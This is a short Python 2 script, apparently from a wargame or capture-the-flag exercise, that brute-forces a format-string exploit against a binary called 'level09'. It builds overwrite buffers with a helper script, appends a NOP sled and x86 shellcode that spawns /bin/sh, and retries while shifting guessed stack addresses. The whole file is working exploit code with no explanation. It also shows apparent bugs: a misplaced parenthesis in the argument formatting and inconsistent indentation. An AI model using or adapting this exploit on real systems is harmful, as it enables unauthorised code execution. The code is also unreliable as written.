import os
import sys
from subprocess import  *

base_value = sys.argv[1]

ret = 0xbffffbfc+0x40
shellcode = 0xbffff830+0x40
buf_suffix = "\x90"*100 + "\x33\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

while True:
    try:
         args = ("python /tmp/ZZZ/format.py -o %s -w %s -b %s -n 3" % (hex(ret)[:-1], hex(shellcode)[:-1]), base_value).split(" ")
         p = Popen(args, stdout=PIPE)
         while p.poll() == None:
             continue
         buf = p.stdout.readlines()[0].strip()
         buf += buf_suffix
         print "[+] Trying buf %s" % repr(buf)
         os.system("./level09 %s" % buf)
         ret -= 4
         shellcode -= 4
 
     except:
         continue
